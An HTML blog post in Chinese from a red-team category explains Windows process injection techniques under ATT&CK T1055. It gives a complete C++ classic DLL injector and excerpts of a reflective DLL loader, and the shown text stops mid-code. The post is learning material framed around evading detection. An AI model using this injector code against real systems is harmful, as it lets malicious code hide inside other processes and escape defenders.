@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2024/07/09/Process-Injection/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2024/07/09/Process-Injection/","path":"2024/07/09/Process-Injection/","title":"Process-Inject-壹"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Process-Inject-壹 | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DLL%E6%B3%A8%E5%85%A5"><span class="nav-text">DLL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%8F%E5%85%B8Dll%E6%B3%A8%E5%85%A5"><span class="nav-text">经典Dll注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84Dll%E6%B3%A8%E5%85%A5"><span class="nav-text">反射Dll注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Memory-Module"><span class="nav-text">Memory Module</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DLL-Hollowing"><span class="nav-text">DLL Hollowing</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E7%B1%BB%E5%9E%8B"><span class="nav-text">内存类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%8F%E5%85%B8Dll-Hollowing"><span class="nav-text">经典Dll Hollowing</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Module-Overloading"><span class="nav-text">Module Overloading</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Module-Stomping"><span class="nav-text">Module Stomping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E8%BF%9C%E7%A8%8B%E6%B3%A8%E5%85%A5"><span class="nav-text">关于远程注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/09/Process-Injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Process-Inject-壹 | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Process-Inject-壹
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-07-09 13:06:40" itemprop="dateCreated datePublished" datetime="2024-07-09T13:06:40+08:00">2024-07-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Red-Team/" itemprop="url" rel="index"><span itemprop="name">Red-Team</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/statehackers.jpg" alt="statehackers"></p>
+<a id="more"></a>
+
+<p>学习代码存放在：<a target="_blank" rel="noopener" href="https://github.com/yongsheng220/ProcessInject">https://github.com/yongsheng220/ProcessInject</a></p>
+<p>进程注入是一种在单独的活动进程中的地址空间中执行任意代码的方法。 在一个进程的上下文中运行特定代码，则有可能访问该进程的内存，系统或网络资源以及提升权限。即将 shellcode/PE “注入” 至某个进程中来尝试规避检测。</p>
+<p>根据ATT&amp;CK，针对进程注入有以下12种分类：</p>
+<ul>
+<li>T1055.001– Dynamic-link Library Injection（dll注入）</li>
+<li>T1055.002– Portable Executable Injection（PE注入）</li>
+<li>T1055.003– Thread Execution Hijacking（线程劫持）</li>
+<li>T1055.004– Asynchronous Procedure Call（APC注入）</li>
+<li>T1055.005– Thread Local Storage（线程本地存储TLS注入）</li>
+<li>T1055.008– Ptrace System Calls（Linux下的Ptrace注入）</li>
+<li>T1055.009– Proc Memory</li>
+<li>T1055.011– Extra Window Memory Injection（额外窗口内存注入）</li>
+<li>T1055.012– Process Hollowing（傀儡进程/进程镂空）</li>
+<li>T1055.013– Process Doppelganging（进程替身/进程分身）</li>
+<li>T1055.014– VDSO Hijacking</li>
+<li>T1055.015– ListPlanting（滥用listview控件）</li>
+</ul>
+<p>整个关系图如下 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/9v6qGqHlzD6Ee3ICOeuVvQ">ATT&amp;CK-防御绕过之进程注入攻防分析</a>：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240613160104871.png"></p>
+<h1 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h1><p>根据ATT&amp;CK框架，该方法还存在三种变体，我将该方法以及变体总结为以下手法</p>
+<ul>
+<li>Classic dll injection:（常规dll注入）</li>
+<li>reflective DLL injection（反射dll注入）</li>
+<li>memory module（内存模块）</li>
+<li>Module Stomping/Overloading 或 DLL Hollowing（模块镂空）</li>
+</ul>
+<h2 id="经典Dll注入"><a href="#经典Dll注入" class="headerlink" title="经典Dll注入"></a>经典Dll注入</h2><p>首先需要恶意dll落地，然后通过远程线程调用LoadLibrary，让目标线程主动加载恶意dll。所以目标进程中的模块列表会有恶意dll。</p>
+<p>流程：</p>
+<ol>
+<li>提升当前进程权限（将访问令牌中禁用的权限启用）</li>
+<li>获取要注入进程的PID</li>
+<li>打开目标线程</li>
+<li>开辟内存空间，存储恶意dll绝对路径</li>
+<li>通过目标进程中的kernel32.dll获取LoadLibrary函数地址</li>
+<li>通过CreateRemoteThread远程调用LoadLibrary，使目标进程加载恶意dll</li>
+</ol>
+<p>首先要将当前进程得到 <strong>SeDebug</strong> 权限，<strong>将访问令牌中禁用的权限启用</strong>。成功调用下面几个函数的前提是进程具备该权限, 只是访问令牌中没有启用该权限. 而如果进程没有该权限, 则使用下面的函数后再调用 <code>GetLastError</code>会返回 <code>ERROR_NOT_ALL_ASSIGN</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;string&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">BOOL PrivilegeEscalation()</span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken);</span><br><span class="line">    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luid);</span><br><span class="line">    tp.PrivilegeCount &#x3D; 1;</span><br><span class="line">    tp.Privileges[0].Attributes &#x3D; SE_PRIVILEGE_ENABLED;</span><br><span class="line">    tp.Privileges[0].Luid &#x3D; luid;</span><br><span class="line">    if (!AdjustTokenPrivileges(hToken, 0, &amp;tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))&#123;</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        return FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        cout &lt;&lt; &quot;[+]提权成功&quot; &lt;&lt; endl;</span><br><span class="line">        return TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL RemoteInjectDll(DWORD Pid, char* DllPath)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 打开远程进程</span><br><span class="line">    HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);</span><br><span class="line">    &#x2F;&#x2F; 在 指定进程 中分配内存</span><br><span class="line">    size_t dwSize &#x3D; strlen(DllPath) + 1;</span><br><span class="line">    LPVOID pDllAddr &#x3D; VirtualAllocEx(hProcess,NULL,dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    &#x2F;&#x2F; 写入到目标进程内存</span><br><span class="line">    WriteProcessMemory(hProcess, pDllAddr, DllPath, dwSize, NULL);</span><br><span class="line">    &#x2F;&#x2F; 从Kernel32.dll 中获取 LoadLibrary 函数</span><br><span class="line">    HMODULE hker &#x3D; GetModuleHandleA(&quot;kernel32.dll&quot;);</span><br><span class="line">    FARPROC pLoadAddr &#x3D; GetProcAddress(hker, &quot;LoadLibraryA&quot;);</span><br><span class="line">    &#x2F;&#x2F; 远程调用</span><br><span class="line">    HANDLE hRemoteHandle &#x3D; CreateRemoteThread(hProcess,NULL,0, (LPTHREAD_START_ROUTINE)pLoadAddr, pDllAddr,0,NULL);</span><br><span class="line">    if (hRemoteHandle &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">        VirtualFreeEx(hProcess, pDllAddr, 0, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        return FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    WaitForSingleObject(hRemoteHandle, INFINITE);</span><br><span class="line"></span><br><span class="line">    CloseHandle(hRemoteHandle);</span><br><span class="line">    VirtualFreeEx(hProcess, pDllAddr, 0, MEM_RELEASE);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    cout &lt;&lt; &quot;[+]dll执行成功&quot; &lt;&lt; endl;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 提升当前进程权限</span><br><span class="line">    if (!PrivilegeEscalation()) &#123;</span><br><span class="line">        cout &lt;&lt; &quot;[-]提升权限失败&quot; &lt;&lt; endl;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DWORD PID;</span><br><span class="line">    char DllPath[40];</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; &quot;[.]DLLfile Path :&quot; &lt;&lt; endl;cin &gt;&gt; DllPath;</span><br><span class="line">    cout &lt;&lt; &quot;[.]Target PRocessID :&quot; &lt;&lt; endl;cin &gt;&gt; PID;</span><br><span class="line">    RemoteInjectDll(PID, DllPath);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对应进程名为notepad.exe，模块列表显示恶意dll。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240615002715858.png"></p>
+<p>PS：当cs执行退出会话时，也会将对应的进程关闭掉。所以注入explorer.exe后退出会话会造成短暂崩溃。但是通过cs的原生inject操作再进行退出会话就不会造成对应进程的崩溃。</p>
+<h2 id="反射Dll注入"><a href="#反射Dll注入" class="headerlink" title="反射Dll注入"></a>反射Dll注入</h2><p>在学习反射dll注入前，首先学习一下 PE文件结构的前置知识 <a target="_blank" rel="noopener" href="https://tttang.com/archive/1553/">PE文件结构从初识到简单shellcode注入</a> 与 模拟PE加载过程 <a target="_blank" rel="noopener" href="https://www.kn0sky.com/?p=37">手工模拟PE加载器</a> 会更好理解该手法，简单来说当windows加载DLL时有以下步骤：</p>
+<ol>
+<li>检测DOS和PE头的合法性。</li>
+<li>尝试在PEHeader.OptionalHeader.ImageBase位置分配PEHeader.OptionalHeader.SizeOfImage字节的内存区域。</li>
+<li>解析Section header中的每个Section，并将它们的实际内容拷贝到第2步分配的地址空间中。拷贝的目的地址的计算方法为：IMAGE_SECTION_HEADER.VirtualAddress偏移 + 第二步分配的内存区域的起始地址。</li>
+<li>检查加载到进程地址空间的位置和之前PE文件中指定的基地址是否一致，如果不一致，则需要重定位。重定位就需要用到1.2节中的IMAGE_OPTIONAL_HEADER64.DataDirectory[5].</li>
+<li>加载该DLL依赖的其他dll，并构建 PEHeader.OptionalHeader.DataDirectory.Image_directory_entry_import 导入表.</li>
+<li>根据每个Section的”PEHeader.Image_Section_Table.Characteristics”属性来设置内存页的访问属性； 如果被设置为”discardable”属性，则释放该内存页。</li>
+<li>获取DLL的入口函数指针，并使用DLL_PROCESS_ATTACH参数调用。</li>
+</ol>
+<p>该注入方法主要特点为：<strong>不使用LoadLibrary</strong> API函数加载磁盘中的DLL，而是通过内嵌/网络下载恶意DLL到内存中，为恶意DLL添加一个导出函数，该导出函数（称为：ReflectiveLoader）功能是 模拟PE加载的过程从而加载自身，最终只要执行该导出函数便可达到无文件落地内存加载目的。因此通过分析工具在模块列表处是看不到恶意DLL的。</p>
+<p>所以完成反射DLL注入需要两部分：1. 带有自实现ReflectiveLoader函数的恶意DLL。2. 注入器。</p>
+<p>如图：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240615152448768.png"></p>
+<p>在恶意DLL中实现ReflectiveLoader过程中，或者说模拟一个PE加载函数需要这么几步：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240615153954111.png" alt="image-20240615153954111"></p>
+<p>代码实现直接参考提出者stephenfewer的开源项目：<a target="_blank" rel="noopener" href="https://github.com/stephenfewer/ReflectiveDLLInjection">stephenfewer/ReflectiveDLLInjection</a></p>
+<p>一、定位DLL在内存中的基址</p>
+<p>调用_ReturnAddress 返回当前调用函数返回的地址，即函数下一跳指令地址，此时返回的不是DLL头部文件的地址，但是比较接近了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uiLibraryAddress &#x3D; caller();</span><br><span class="line"></span><br><span class="line">__declspec(noinline) ULONG_PTR caller( VOID ) &#123; return (ULONG_PTR)_ReturnAddress(); &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后通过逐字节遍历，查找是否符合DOS头（MZ），接着通过e_lfanew字段得到NT头地址，再校验Signature字段是否符合PE标记。都满足就判定当前 uiLibraryAddress 的地址就是DLL的基址。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while( TRUE )</span><br><span class="line">&#123;</span><br><span class="line">    if( ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_magic &#x3D;&#x3D; IMAGE_DOS_SIGNATURE )</span><br><span class="line">    &#123;</span><br><span class="line">        uiHeaderValue &#x3D; ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_lfanew;</span><br><span class="line">        &#x2F;&#x2F; some x64 dll&#39;s can trigger a bogus signature (IMAGE_DOS_SIGNATURE &#x3D;&#x3D; &#39;POP r10&#39;),</span><br><span class="line">        &#x2F;&#x2F; we sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.</span><br><span class="line">        if( uiHeaderValue &gt;&#x3D; sizeof(IMAGE_DOS_HEADER) &amp;&amp; uiHeaderValue &lt; 1024 )</span><br><span class="line">        &#123;</span><br><span class="line">            uiHeaderValue +&#x3D; uiLibraryAddress;</span><br><span class="line">            &#x2F;&#x2F; break if we have found a valid MZ&#x2F;PE header</span><br><span class="line">            if( ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;Signature &#x3D;&#x3D; IMAGE_NT_SIGNATURE )</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    uiLibraryAddress--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>二、获取所需的系统API函数</p>
+<p>通过解析PEB结构体中的 Ldr 中的 InMemoryOrderModuleList 获取指定的 DLL（kernel32.dll、ntdll.dll）</p>
+<p>x64下通过gs寄存器获取PEB地址</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#ifdef WIN_X64</span><br><span class="line">	uiBaseAddress &#x3D; __readgsqword( 0x60 );</span><br><span class="line">#else</span><br><span class="line">#ifdef WIN_X86</span><br><span class="line">	uiBaseAddress &#x3D; __readfsdword( 0x30 );</span><br><span class="line">#else WIN_ARM</span><br><span class="line">	uiBaseAddress &#x3D; *(DWORD *)( (BYTE *)_MoveFromCoprocessor( 15, 0, 13, 0, 2 ) + 0x30 );</span><br><span class="line">#endif</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>
+
+<p>通过 Ldr.InMemoryOrderModuleList 匹配DLL名称hash。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uiBaseAddress &#x3D; (ULONG_PTR)((_PPEB)uiBaseAddress)-&gt;pLdr;</span><br><span class="line"></span><br><span class="line">uiValueA &#x3D; (ULONG_PTR)((PPEB_LDR_DATA)uiBaseAddress)-&gt;InMemoryOrderModuleList.Flink;</span><br><span class="line">while( uiValueA )</span><br><span class="line">&#123;</span><br><span class="line">    uiValueB &#x3D; (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)-&gt;BaseDllName.pBuffer;</span><br><span class="line">    usCounter &#x3D; ((PLDR_DATA_TABLE_ENTRY)uiValueA)-&gt;BaseDllName.Length;</span><br><span class="line">    uiValueC &#x3D; 0;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">        uiValueC &#x3D; ror( (DWORD)uiValueC );</span><br><span class="line">        if( *((BYTE *)uiValueB) &gt;&#x3D; &#39;a&#39; )</span><br><span class="line">            uiValueC +&#x3D; *((BYTE *)uiValueB) - 0x20;</span><br><span class="line">        else</span><br><span class="line">            uiValueC +&#x3D; *((BYTE *)uiValueB);</span><br><span class="line">        uiValueB++;</span><br><span class="line">    &#125; while( --usCounter );</span><br><span class="line"></span><br><span class="line">if( (DWORD)uiValueC &#x3D;&#x3D; KERNEL32DLL_HASH )</span><br><span class="line">&#123;</span><br><span class="line">	......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过继续解析PEB找到 NT头、导出表、导出函数地址数组、导出函数名数组和导出函数序号数组后，对所需函数进行hash匹配，至此获取所需函数地址。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">......</span><br><span class="line">if( dwHashValue &#x3D;&#x3D; LOADLIBRARYA_HASH || dwHashValue &#x3D;&#x3D; GETPROCADDRESS_HASH || dwHashValue &#x3D;&#x3D; VIRTUALALLOC_HASH )</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; get the VA for the array of addresses</span><br><span class="line">    uiAddressArray &#x3D; ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; use this functions name ordinal as an index into the array of name pointers</span><br><span class="line">    uiAddressArray +&#x3D; ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; store this functions VA</span><br><span class="line">    if( dwHashValue &#x3D;&#x3D; LOADLIBRARYA_HASH )</span><br><span class="line">        pLoadLibraryA &#x3D; (LOADLIBRARYA)( uiBaseAddress + DEREF_32( uiAddressArray ) );</span><br><span class="line">    else if( dwHashValue &#x3D;&#x3D; GETPROCADDRESS_HASH )</span><br><span class="line">        pGetProcAddress &#x3D; (GETPROCADDRESS)( uiBaseAddress + DEREF_32( uiAddressArray ) );</span><br><span class="line">    else if( dwHashValue &#x3D;&#x3D; VIRTUALALLOC_HASH )</span><br><span class="line">        pVirtualAlloc &#x3D; (VIRTUALALLOC)( uiBaseAddress + DEREF_32( uiAddressArray ) );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; decrement our counter</span><br><span class="line">    usCounter--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>三、申请装载DLL的内存空间/复制PE头和各个节</p>
+<p>通过 e_lfanew 获取到 NT头中的SizeOfImage，开辟空间，将NT头部信息复制到空间中</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uiBaseAddress &#x3D; (ULONG_PTR)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );</span><br><span class="line"></span><br><span class="line">uiValueA &#x3D; ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.SizeOfHeaders;</span><br><span class="line">uiValueB &#x3D; uiLibraryAddress;</span><br><span class="line">uiValueC &#x3D; uiBaseAddress;</span><br><span class="line"></span><br><span class="line">while( uiValueA-- )</span><br><span class="line">    *(BYTE *)uiValueC++ &#x3D; *(BYTE *)uiValueB++;</span><br></pre></td></tr></table></figure>
+
+<p>同样方式将各个节复制到空间中</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; itterate through all sections, loading them into memory.</span><br><span class="line">uiValueE &#x3D; ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;FileHeader.NumberOfSections;</span><br><span class="line">while( uiValueE-- )</span><br><span class="line">&#123;</span><br><span class="line">	&#x2F;&#x2F; uiValueB is the VA for this section</span><br><span class="line">	uiValueB &#x3D; ( uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)-&gt;VirtualAddress );</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; uiValueC if the VA for this sections data</span><br><span class="line">	uiValueC &#x3D; ( uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)-&gt;PointerToRawData );</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; copy the section over</span><br><span class="line">	uiValueD &#x3D; ((PIMAGE_SECTION_HEADER)uiValueA)-&gt;SizeOfRawData;</span><br><span class="line"></span><br><span class="line">	while( uiValueD-- )</span><br><span class="line">		*(BYTE *)uiValueB++ &#x3D; *(BYTE *)uiValueC++;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; get the VA of the next section</span><br><span class="line">	uiValueA +&#x3D; sizeof( IMAGE_SECTION_HEADER );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>四、处理DLL导入表</p>
+<p>PE文件的导入表（Import Table）列出了该文件依赖的外部DLL及其导入的函数。加载器解析导入表，并使用 <code>LoadLibrary</code>和<code>GetProcAddress</code> 函数加载所需的DLL，获取导入函数的地址，并填充导入地址表（IAT）</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240616005830412.png"></p>
+<p>PE加载前</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240616005910129.png" alt="image-20240616005910129"></p>
+<p>PE加载后：IAT被填充函数地址</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240616010142570.png" alt="image-20240616010142570"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 通过NT头的数据目录获取导出表的地址</span><br><span class="line">uiValueB &#x3D; (ULONG_PTR)&amp;((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];</span><br><span class="line"></span><br><span class="line">uiValueC &#x3D; ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)-&gt;VirtualAddress );</span><br><span class="line"></span><br><span class="line">while( ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)-&gt;Name )</span><br><span class="line">&#123;</span><br><span class="line">	&#x2F;&#x2F; 使用LoadLibraryA加载所需要的DLL</span><br><span class="line">	uiLibraryAddress &#x3D; (ULONG_PTR)pLoadLibraryA( (LPCSTR)( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)-&gt;Name ) );</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; OriginalFirstThunk</span><br><span class="line">	uiValueD &#x3D; ( uiBaseAddress + 